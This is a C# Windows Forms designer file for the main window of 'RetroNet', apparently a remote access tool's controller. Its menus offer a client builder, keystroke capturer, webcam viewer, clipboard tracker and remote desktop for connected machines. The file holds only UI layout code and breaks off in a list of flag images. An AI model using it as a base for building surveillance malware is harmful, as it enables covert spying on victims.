namespace RetroNet.Forms
{
    partial class Main
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
            this.mainMenuStrip = new System.Windows.Forms.MenuStrip();
            this.connectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.configurationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clientBuilderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pluginsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uPnPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileTransfersToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.newsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mainStatusStrip = new System.Windows.Forms.StatusStrip();
            this.connectedUsersNameLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.connectedUsersValueLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.selectedUsersNameLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.selectedUsersValueLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.dataReceivedNameLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.dataReceivedValueLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.dataSentNameLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.dataSentValueLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.functionsMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.clientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uninstallClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.restartClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clientStripSeparator = new System.Windows.Forms.ToolStripSeparator();
            this.updateClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fromFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fromUrlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.computerStripSeparator = new System.Windows.Forms.ToolStripSeparator();
            this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.webcamViewerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileExplorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.processManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.keystrokeCapturerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clipboardTrackerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.applicationHandlerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.registryEditorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startupMonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.serviceAdministerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.instantMessengerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteStripSeparator = new System.Windows.Forms.ToolStripSeparator();
            this.shutDownComputerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.restartComputerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.logOffComputerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.flagsImageList = new System.Windows.Forms.ImageList(this.components);
            this.mainNotifyIcon = new System.Windows.Forms.NotifyIcon(this.components);
            this.logToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.connectionsListView = new RetroNet.Controls.AeroListView();
            this.countryHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.identityHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ipAddressHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.portHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.operatingSystemHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.computerNameHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.userNameHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.cpuHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.ramHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.versionHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.mainMenuStrip.SuspendLayout();
            this.mainStatusStrip.SuspendLayout();
            this.functionsMenuStrip.SuspendLayout();
            this.SuspendLayout();
            // 
            // mainMenuStrip
            // 
            this.mainMenuStrip.BackColor = System.Drawing.SystemColors.Menu;
            this.mainMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.connectToolStripMenuItem,
            this.configurationToolStripMenuItem,
            this.clientBuilderToolStripMenuItem,
            this.pluginsToolStripMenuItem,
            this.uPnPToolStripMenuItem,
            this.fileTransfersToolStripMenuItem,
            this.logToolStripMenuItem,
            this.newsToolStripMenuItem,
            this.aboutToolStripMenuItem});
            this.mainMenuStrip.Location = new System.Drawing.Point(0, 0);
            this.mainMenuStrip.Name = "mainMenuStrip";
            this.mainMenuStrip.Size = new System.Drawing.Size(909, 24);
            this.mainMenuStrip.TabIndex = 0;
            this.mainMenuStrip.Text = "menuStrip1";
            // 
            // connectToolStripMenuItem
            // 
            this.connectToolStripMenuItem.Image = global::RetroNet.Properties.Resources.connect;
            this.connectToolStripMenuItem.Name = "connectToolStripMenuItem";
            this.connectToolStripMenuItem.Size = new System.Drawing.Size(80, 20);
            this.connectToolStripMenuItem.Text = "Connect";
            this.connectToolStripMenuItem.Click += new System.EventHandler(this.connectToolStripMenuItem_Click);
            // 
            // configurationToolStripMenuItem
            // 
            this.configurationToolStripMenuItem.Image = global::RetroNet.Properties.Resources.wrench_orange;
            this.configurationToolStripMenuItem.Name = "configurationToolStripMenuItem";
            this.configurationToolStripMenuItem.Size = new System.Drawing.Size(109, 20);
            this.configurationToolStripMenuItem.Text = "Configuration";
            this.configurationToolStripMenuItem.Click += new System.EventHandler(this.configurationToolStripMenuItem_Click);
            // 
            // clientBuilderToolStripMenuItem
            // 
            this.clientBuilderToolStripMenuItem.Image = global::RetroNet.Properties.Resources.bricks;
            this.clientBuilderToolStripMenuItem.Name = "clientBuilderToolStripMenuItem";
            this.clientBuilderToolStripMenuItem.Size = new System.Drawing.Size(106, 20);
            this.clientBuilderToolStripMenuItem.Text = "Client Builder";
            this.clientBuilderToolStripMenuItem.Click += new System.EventHandler(this.clientBuilderToolStripMenuItem_Click);
            // 
            // pluginsToolStripMenuItem
            // 
            this.pluginsToolStripMenuItem.Image = global::RetroNet.Properties.Resources.plugin;
            this.pluginsToolStripMenuItem.Name = "pluginsToolStripMenuItem";
            this.pluginsToolStripMenuItem.Size = new System.Drawing.Size(74, 20);
            this.pluginsToolStripMenuItem.Text = "Plugins";
            this.pluginsToolStripMenuItem.Click += new System.EventHandler(this.pluginsToolStripMenuItem_Click);
            // 
            // uPnPToolStripMenuItem
            // 
            this.uPnPToolStripMenuItem.Image = global::RetroNet.Properties.Resources.drive_network;
            this.uPnPToolStripMenuItem.Name = "uPnPToolStripMenuItem";
            this.uPnPToolStripMenuItem.Size = new System.Drawing.Size(64, 20);
            this.uPnPToolStripMenuItem.Text = "UPnP";
            this.uPnPToolStripMenuItem.Click += new System.EventHandler(this.uPnPToolStripMenuItem_Click);
            // 
            // fileTransfersToolStripMenuItem
            // 
            this.fileTransfersToolStripMenuItem.Image = global::RetroNet.Properties.Resources.page_copy;
            this.fileTransfersToolStripMenuItem.Name = "fileTransfersToolStripMenuItem";
            this.fileTransfersToolStripMenuItem.Size = new System.Drawing.Size(104, 20);
            this.fileTransfersToolStripMenuItem.Text = "File Transfers";
            this.fileTransfersToolStripMenuItem.Click += new System.EventHandler(this.fileTransfersToolStripMenuItem_Click);
            // 
            // newsToolStripMenuItem
            // 
            this.newsToolStripMenuItem.Image = global::RetroNet.Properties.Resources.newspaper;
            this.newsToolStripMenuItem.Name = "newsToolStripMenuItem";
            this.newsToolStripMenuItem.Size = new System.Drawing.Size(64, 20);
            this.newsToolStripMenuItem.Text = "News";
            this.newsToolStripMenuItem.Click += new System.EventHandler(this.newsToolStripMenuItem_Click);
            // 
            // aboutToolStripMenuItem
            // 
            this.aboutToolStripMenuItem.Image = global::RetroNet.Properties.Resources.information;
            this.aboutToolStripMenuItem.Name = "aboutToolStripMenuItem";
            this.aboutToolStripMenuItem.Size = new System.Drawing.Size(68, 20);
            this.aboutToolStripMenuItem.Text = "About";
            this.aboutToolStripMenuItem.Click += new System.EventHandler(this.aboutToolStripMenuItem_Click);
            // 
            // mainStatusStrip
            // 
            this.mainStatusStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.connectedUsersNameLabel,
            this.connectedUsersValueLabel,
            this.selectedUsersNameLabel,
            this.selectedUsersValueLabel,
            this.dataReceivedNameLabel,
            this.dataReceivedValueLabel,
            this.dataSentNameLabel,
            this.dataSentValueLabel});
            this.mainStatusStrip.Location = new System.Drawing.Point(0, 204);
            this.mainStatusStrip.Name = "mainStatusStrip";
            this.mainStatusStrip.Size = new System.Drawing.Size(909, 22);
            this.mainStatusStrip.TabIndex = 2;
            this.mainStatusStrip.Text = "statusStrip1";
            // 
            // connectedUsersNameLabel
            // 
            this.connectedUsersNameLabel.Image = global::RetroNet.Properties.Resources.user;
            this.connectedUsersNameLabel.Name = "connectedUsersNameLabel";
            this.connectedUsersNameLabel.Size = new System.Drawing.Size(115, 17);
            this.connectedUsersNameLabel.Text = "Connected Users:";
            // 
            // connectedUsersValueLabel
            // 
            this.connectedUsersValueLabel.AutoSize = false;
            this.connectedUsersValueLabel.Name = "connectedUsersValueLabel";
            this.connectedUsersValueLabel.Size = new System.Drawing.Size(40, 17);
            this.connectedUsersValueLabel.Text = "0";
            this.connectedUsersValueLabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // selectedUsersNameLabel
            // 
            this.selectedUsersNameLabel.Image = global::RetroNet.Properties.Resources.user_go;
            this.selectedUsersNameLabel.Name = "selectedUsersNameLabel";
            this.selectedUsersNameLabel.Size = new System.Drawing.Size(101, 17);
            this.selectedUsersNameLabel.Text = "Selected Users:";
            // 
            // selectedUsersValueLabel
            // 
            this.selectedUsersValueLabel.AutoSize = false;
            this.selectedUsersValueLabel.Name = "selectedUsersValueLabel";
            this.selectedUsersValueLabel.Size = new System.Drawing.Size(40, 17);
            this.selectedUsersValueLabel.Text = "0";
            this.selectedUsersValueLabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // dataReceivedNameLabel
            // 
            this.dataReceivedNameLabel.Image = global::RetroNet.Properties.Resources.arrow_in;
            this.dataReceivedNameLabel.ImageAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.dataReceivedNameLabel.Name = "dataReceivedNameLabel";
            this.dataReceivedNameLabel.Size = new System.Drawing.Size(382, 17);
            this.dataReceivedNameLabel.Spring = true;
            this.dataReceivedNameLabel.Text = "Data Received:";
            this.dataReceivedNameLabel.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            // 
            // dataReceivedValueLabel
            // 
            this.dataReceivedValueLabel.AutoSize = false;
            this.dataReceivedValueLabel.Name = "dataReceivedValueLabel";
            this.dataReceivedValueLabel.Size = new System.Drawing.Size(70, 17);
            this.dataReceivedValueLabel.Text = "0 Bytes";
            this.dataReceivedValueLabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // dataSentNameLabel
            // 
            this.dataSentNameLabel.Image = global::RetroNet.Properties.Resources.arrow_out;
            this.dataSentNameLabel.Name = "dataSentNameLabel";
            this.dataSentNameLabel.Size = new System.Drawing.Size(76, 17);
            this.dataSentNameLabel.Text = "Data Sent:";
            // 
            // dataSentValueLabel
            // 
            this.dataSentValueLabel.AutoSize = false;
            this.dataSentValueLabel.Name = "dataSentValueLabel";
            this.dataSentValueLabel.Size = new System.Drawing.Size(70, 17);
            this.dataSentValueLabel.Text = "0 Bytes";
            this.dataSentValueLabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // functionsMenuStrip
            // 
            this.functionsMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.clientToolStripMenuItem,
            this.computerStripSeparator,
            this.remoteDesktopToolStripMenuItem,
            this.webcamViewerToolStripMenuItem,
            this.fileExplorerToolStripMenuItem,
            this.processManagerToolStripMenuItem,
            this.keystrokeCapturerToolStripMenuItem,
            this.clipboardTrackerToolStripMenuItem,
            this.applicationHandlerToolStripMenuItem,
            this.registryEditorToolStripMenuItem,
            this.startupMonitorToolStripMenuItem,
            this.serviceAdministerToolStripMenuItem,
            this.instantMessengerToolStripMenuItem,
            this.remoteStripSeparator,
            this.shutDownComputerToolStripMenuItem,
            this.restartComputerToolStripMenuItem,
            this.logOffComputerToolStripMenuItem});
            this.functionsMenuStrip.Name = "functionsMenuStrip";
            this.functionsMenuStrip.Size = new System.Drawing.Size(181, 346);
            this.functionsMenuStrip.Opening += new System.ComponentModel.CancelEventHandler(this.functionsMenuStrip_Opening);
            // 
            // clientToolStripMenuItem
            // 
            this.clientToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.uninstallClientToolStripMenuItem,
            this.restartClientToolStripMenuItem,
            this.clientStripSeparator,
            this.updateClientToolStripMenuItem});
            this.clientToolStripMenuItem.Image = global::RetroNet.Properties.Resources.user_suit;
            this.clientToolStripMenuItem.Name = "clientToolStripMenuItem";
            this.clientToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.clientToolStripMenuItem.Text = "Client";
            // 
            // uninstallClientToolStripMenuItem
            // 
            this.uninstallClientToolStripMenuItem.Image = global::RetroNet.Properties.Resources.cross;
            this.uninstallClientToolStripMenuItem.Name = "uninstallClientToolStripMenuItem";
            this.uninstallClientToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
            this.uninstallClientToolStripMenuItem.Text = "Uninstall";
            this.uninstallClientToolStripMenuItem.Click += new System.EventHandler(this.uninstallClientToolStripMenuItem_Click);
            // 
            // restartClientToolStripMenuItem
            // 
            this.restartClientToolStripMenuItem.Image = global::RetroNet.Properties.Resources.arrow_rotate_clockwise;
            this.restartClientToolStripMenuItem.Name = "restartClientToolStripMenuItem";
            this.restartClientToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
            this.restartClientToolStripMenuItem.Text = "Restart";
            this.restartClientToolStripMenuItem.Click += new System.EventHandler(this.restartClientToolStripMenuItem_Click);
            // 
            // clientStripSeparator
            // 
            this.clientStripSeparator.Name = "clientStripSeparator";
            this.clientStripSeparator.Size = new System.Drawing.Size(117, 6);
            // 
            // updateClientToolStripMenuItem
            // 
            this.updateClientToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fromFileToolStripMenuItem,
            this.fromUrlToolStripMenuItem});
            this.updateClientToolStripMenuItem.Image = global::RetroNet.Properties.Resources.arrow_up;
            this.updateClientToolStripMenuItem.Name = "updateClientToolStripMenuItem";
            this.updateClientToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
            this.updateClientToolStripMenuItem.Text = "Update";
            // 
            // fromFileToolStripMenuItem
            // 
            this.fromFileToolStripMenuItem.Image = global::RetroNet.Properties.Resources.page;
            this.fromFileToolStripMenuItem.Name = "fromFileToolStripMenuItem";
            this.fromFileToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
            this.fromFileToolStripMenuItem.Text = "From File";
            this.fromFileToolStripMenuItem.Click += new System.EventHandler(this.fromFileToolStripMenuItem_Click);
            // 
            // fromUrlToolStripMenuItem
            // 
            this.fromUrlToolStripMenuItem.Image = global::RetroNet.Properties.Resources.page_world;
            this.fromUrlToolStripMenuItem.Name = "fromUrlToolStripMenuItem";
            this.fromUrlToolStripMenuItem.Size = new System.Drawing.Size(123, 22);
            this.fromUrlToolStripMenuItem.Text = "From Url";
            this.fromUrlToolStripMenuItem.Click += new System.EventHandler(this.fromUrlToolStripMenuItem_Click);
            // 
            // computerStripSeparator
            // 
            this.computerStripSeparator.Name = "computerStripSeparator";
            this.computerStripSeparator.Size = new System.Drawing.Size(177, 6);
            // 
            // remoteDesktopToolStripMenuItem
            // 
            this.remoteDesktopToolStripMenuItem.Image = global::RetroNet.Properties.Resources.monitor;
            this.remoteDesktopToolStripMenuItem.Name = "remoteDesktopToolStripMenuItem";
            this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.remoteDesktopToolStripMenuItem.Text = "Remote Desktop";
            this.remoteDesktopToolStripMenuItem.Click += new System.EventHandler(this.remoteDesktopToolStripMenuItem_Click);
            // 
            // webcamViewerToolStripMenuItem
            // 
            this.webcamViewerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.webcam;
            this.webcamViewerToolStripMenuItem.Name = "webcamViewerToolStripMenuItem";
            this.webcamViewerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.webcamViewerToolStripMenuItem.Text = "Webcam Viewer";
            this.webcamViewerToolStripMenuItem.Click += new System.EventHandler(this.webcamViewerToolStripMenuItem_Click);
            // 
            // fileExplorerToolStripMenuItem
            // 
            this.fileExplorerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.folder;
            this.fileExplorerToolStripMenuItem.Name = "fileExplorerToolStripMenuItem";
            this.fileExplorerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.fileExplorerToolStripMenuItem.Text = "File Explorer";
            this.fileExplorerToolStripMenuItem.Click += new System.EventHandler(this.fileExplorerToolStripMenuItem_Click);
            // 
            // processManagerToolStripMenuItem
            // 
            this.processManagerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.application_view_list;
            this.processManagerToolStripMenuItem.Name = "processManagerToolStripMenuItem";
            this.processManagerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.processManagerToolStripMenuItem.Text = "Process Manager";
            this.processManagerToolStripMenuItem.Click += new System.EventHandler(this.processManagerToolStripMenuItem_Click);
            // 
            // keystrokeCapturerToolStripMenuItem
            // 
            this.keystrokeCapturerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.keyboard;
            this.keystrokeCapturerToolStripMenuItem.Name = "keystrokeCapturerToolStripMenuItem";
            this.keystrokeCapturerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.keystrokeCapturerToolStripMenuItem.Text = "Keystroke Capturer";
            this.keystrokeCapturerToolStripMenuItem.Click += new System.EventHandler(this.keystrokeCapturerToolStripMenuItem_Click);
            // 
            // clipboardTrackerToolStripMenuItem
            // 
            this.clipboardTrackerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.page_paste;
            this.clipboardTrackerToolStripMenuItem.Name = "clipboardTrackerToolStripMenuItem";
            this.clipboardTrackerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.clipboardTrackerToolStripMenuItem.Text = "Clipboard Tracker";
            this.clipboardTrackerToolStripMenuItem.Click += new System.EventHandler(this.clipboardTrackerToolStripMenuItem_Click);
            // 
            // applicationHandlerToolStripMenuItem
            // 
            this.applicationHandlerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.application_cascade;
            this.applicationHandlerToolStripMenuItem.Name = "applicationHandlerToolStripMenuItem";
            this.applicationHandlerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.applicationHandlerToolStripMenuItem.Text = "Application Handler";
            this.applicationHandlerToolStripMenuItem.Click += new System.EventHandler(this.applicationHandlerToolStripMenuItem_Click);
            // 
            // registryEditorToolStripMenuItem
            // 
            this.registryEditorToolStripMenuItem.Image = global::RetroNet.Properties.Resources.cog;
            this.registryEditorToolStripMenuItem.Name = "registryEditorToolStripMenuItem";
            this.registryEditorToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.registryEditorToolStripMenuItem.Text = "Registry Editor";
            this.registryEditorToolStripMenuItem.Click += new System.EventHandler(this.registryEditorToolStripMenuItem_Click);
            // 
            // startupMonitorToolStripMenuItem
            // 
            this.startupMonitorToolStripMenuItem.Image = global::RetroNet.Properties.Resources.shield;
            this.startupMonitorToolStripMenuItem.Name = "startupMonitorToolStripMenuItem";
            this.startupMonitorToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startupMonitorToolStripMenuItem.Text = "Startup Monitor";
            this.startupMonitorToolStripMenuItem.Click += new System.EventHandler(this.startupMonitorToolStripMenuItem_Click);
            // 
            // serviceAdministerToolStripMenuItem
            // 
            this.serviceAdministerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.lorry;
            this.serviceAdministerToolStripMenuItem.Name = "serviceAdministerToolStripMenuItem";
            this.serviceAdministerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.serviceAdministerToolStripMenuItem.Text = "Service Administer";
            this.serviceAdministerToolStripMenuItem.Click += new System.EventHandler(this.serviceAdministerToolStripMenuItem_Click);
            // 
            // instantMessengerToolStripMenuItem
            // 
            this.instantMessengerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.comments;
            this.instantMessengerToolStripMenuItem.Name = "instantMessengerToolStripMenuItem";
            this.instantMessengerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.instantMessengerToolStripMenuItem.Text = "Instant Messenger";
            this.instantMessengerToolStripMenuItem.Click += new System.EventHandler(this.instantMessengerToolStripMenuItem_Click);
            // 
            // remoteStripSeparator
            // 
            this.remoteStripSeparator.Name = "remoteStripSeparator";
            this.remoteStripSeparator.Size = new System.Drawing.Size(177, 6);
            // 
            // shutDownComputerToolStripMenuItem
            // 
            this.shutDownComputerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.flag_red;
            this.shutDownComputerToolStripMenuItem.Name = "shutDownComputerToolStripMenuItem";
            this.shutDownComputerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.shutDownComputerToolStripMenuItem.Text = "Shut Down";
            this.shutDownComputerToolStripMenuItem.Click += new System.EventHandler(this.shutDownComputerToolStripMenuItem_Click);
            // 
            // restartComputerToolStripMenuItem
            // 
            this.restartComputerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.flag_green;
            this.restartComputerToolStripMenuItem.Name = "restartComputerToolStripMenuItem";
            this.restartComputerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.restartComputerToolStripMenuItem.Text = "Restart";
            this.restartComputerToolStripMenuItem.Click += new System.EventHandler(this.restartComputerToolStripMenuItem_Click);
            // 
            // logOffComputerToolStripMenuItem
            // 
            this.logOffComputerToolStripMenuItem.Image = global::RetroNet.Properties.Resources.flag_yellow;
            this.logOffComputerToolStripMenuItem.Name = "logOffComputerToolStripMenuItem";
            this.logOffComputerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.logOffComputerToolStripMenuItem.Text = "Log Off";
            this.logOffComputerToolStripMenuItem.Click += new System.EventHandler(this.logOffComputerToolStripMenuItem_Click);
            // 
            // flagsImageList
            // 
            this.flagsImageList.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("flagsImageList.ImageStream")));
            this.flagsImageList.TransparentColor = System.Drawing.Color.Transparent;
            this.flagsImageList.Images.SetKeyName(0, "ad.png");
            this.flagsImageList.Images.SetKeyName(1, "ae.png");
            this.flagsImageList.Images.SetKeyName(2, "af.png");
            this.flagsImageList.Images.SetKeyName(3, "ag.png");
            this.flagsImageList.Images.SetKeyName(4, "ai.png");
            this.flagsImageList.Images.SetKeyName(5, "al.png");
            this.flagsImageList.Images.SetKeyName(6, "am.png");
            this.flagsImageList.Images.SetKeyName(7, "an.png");
            this.flagsImageList.Images.SetKeyName(8, "ao.png");
            this.flagsImageList.Images.SetKeyName(9, "ar.png");
            this.flagsImageList.Images.SetKeyName(10, "as.png");
            this.flagsImageList.Images.SetKeyName(11, "at.png");
            this.flagsImageList.Images.SetKeyName(12, "au.png");
            this.flagsImageList.Images.SetKeyName(13, "aw.png");
            this.flagsImageList.Images.SetKeyName(14, "ax.png");
            this.flagsImageList.Images.SetKeyName(15, "az.png");
            this.flagsImageList.Images.SetKeyName(16, "ba.png");
            this.flagsImageList.Images.SetKeyName(17, "bb.png");
            this.flagsImageList.Images.SetKeyName(18, "bd.png");
            this.flagsImageList.Images.SetKeyName(19, "be.png");
            this.flagsImageList.Images.SetKeyName(20, "bf.png");
            this.flagsImageList.Images.SetKeyName(21, "bg.png");
            this.flagsImageList.Images.SetKeyName(22, "bh.png");
            this.flagsImageList.Images.SetKeyName(23, "bi.png");
            this.flagsImageList.Images.SetKeyName(24, "bj.png");
            this.flagsImageList.Images.SetKeyName(25, "bm.png");
            this.flagsImageList.Images.SetKeyName(26, "bn.png");
            this.flagsImageList.Images.SetKeyName(27, "bo.png");
            this.flagsImageList.Images.SetKeyName(28, "br.png");
            this.flagsImageList.Images.SetKeyName(29, "bs.png");
            this.flagsImageList.Images.SetKeyName(30, "bt.png");
            this.flagsImageList.Images.SetKeyName(31, "bv.png");
            this.flagsImageList.Images.SetKeyName(32, "bw.png");
            this.flagsImageList.Images.SetKeyName(33, "by.png");
            this.flagsImageList.Images.SetKeyName(34, "bz.png");
            this.flagsImageList.Images.SetKeyName(35, "ca.png");
            this.flagsImageList.Images.SetKeyName(36, "catalonia.png");
            this.flagsImageList.Images.SetKeyName(37, "cc.png");
            this.flagsImageList.Images.SetKeyName(38, "cd.png");
            this.flagsImageList.Images.SetKeyName(39, "cf.png");
            this.flagsImageList.Images.SetKeyName(40, "cg.png");
            this.flagsImageList.Images.SetKeyName(41, "ch.png");
            this.flagsImageList.Images.SetKeyName(42, "ci.png");
            this.flagsImageList.Images.SetKeyName(43, "ck.png");
            this.flagsImageList.Images.SetKeyName(44, "cl.png");
            this.flagsImageList.Images.SetKeyName(45, "cm.png");
            this.flagsImageList.Images.SetKeyName(46, "cn.png");
            this.flagsImageList.Images.SetKeyName(47, "co.png");
            this.flagsImageList.Images.SetKeyName(48, "cr.png");
            this.flagsImageList.Images.SetKeyName(49, "cs.png");
            this.flagsImageList.Images.SetKeyName(50, "cu.png");
            this.flagsImageList.Images.SetKeyName(51, "cv.png");
            this.flagsImageList.Images.SetKeyName(52, "cx.png");
            this.flagsImageList.Images.SetKeyName(53, "cy.png");
            this.flagsImageList.Images.SetKeyName(54, "cz.png");
            this.flagsImageList.Images.SetKeyName(55, "de.png");
            this.flagsImageList.Images.SetKeyName(56, "dj.png");
            this.flagsImageList.Images.SetKeyName(57, "dk.png");
            this.flagsImageList.Images.SetKeyName(58, "dm.png");
            this.flagsImageList.Images.SetKeyName(59, "do.png");
            this.flagsImageList.Images.SetKeyName(60, "dz.png");
            this.flagsImageList.Images.SetKeyName(61, "ec.png");
            this.flagsImageList.Images.SetKeyName(62, "ee.png");
            this.flagsImageList.Images.SetKeyName(63, "eg.png");
            this.flagsImageList.Images.SetKeyName(64, "eh.png");
            this.flagsImageList.Images.SetKeyName(65, "england.png");
            this.flagsImageList.Images.SetKeyName(66, "er.png");
            this.flagsImageList.Images.SetKeyName(67, "es.png");
            this.flagsImageList.Images.SetKeyName(68, "et.png");
            this.flagsImageList.Images.SetKeyName(69, "europeanunion.png");
            this.flagsImageList.Images.SetKeyName(70, "fam.png");
            this.flagsImageList.Images.SetKeyName(71, "fi.png");
            this.flagsImageList.Images.SetKeyName(72, "fj.png");
            this.flagsImageList.Images.SetKeyName(73, "fk.png");
            this.flagsImageList.Images.SetKeyName(74, "fm.png");
            this.flagsImageList.Images.SetKeyName(75, "fo.png");
            this.flagsImageList.Images.SetKeyName(76, "fr.png");
            this.flagsImageList.Images.SetKeyName(77, "ga.png");
            this.flagsImageList.Images.SetKeyName(78, "gb.png");
            this.flagsImageList.Images.SetKeyName(79, "gd.png");
            this.flagsImageList.Images.SetKeyName(80, "ge.png");
            this.flagsImageList.Images.SetKeyName(81, "gf.png");
            this.flagsImageList.Images.SetKeyName(82, "gh.png");
            this.flagsImageList.Images.SetKeyName(83, "gi.png");
            this.flagsImageList.Images.SetKeyName(84, "gl.png");
            this.flagsImageList.Images.SetKeyName(85, "gm.png");
            this.flagsImageList.Images.SetKeyName(86, "gn.png");
            this.flagsImageList.Images.SetKeyName(87, "gp.png");
            this.flagsImageList.Images.SetKeyName(88, "gq.png");
            this.flagsImageList.Images.SetKeyName(89, "gr.png");
            this.flagsImageList.Images.SetKeyName(90, "gs.png");
            this.flagsImageList.Images.SetKeyName(91, "gt.png");
            this.flagsImageList.Images.SetKeyName(92, "gu.png");
            this.flagsImageList.Images.SetKeyName(93, "gw.png");
            this.flagsImageList.Images.SetKeyName(94, "gy.png");
            this.flagsImageList.Images.SetKeyName(95, "hk.png");
            this.flagsImageList.Images.SetKeyName(96, "hm.png");
            this.flagsImageList.Images.SetKeyName(97, "hn.png");
            this.flagsImageList.Images.SetKeyName(98, "hr.png");
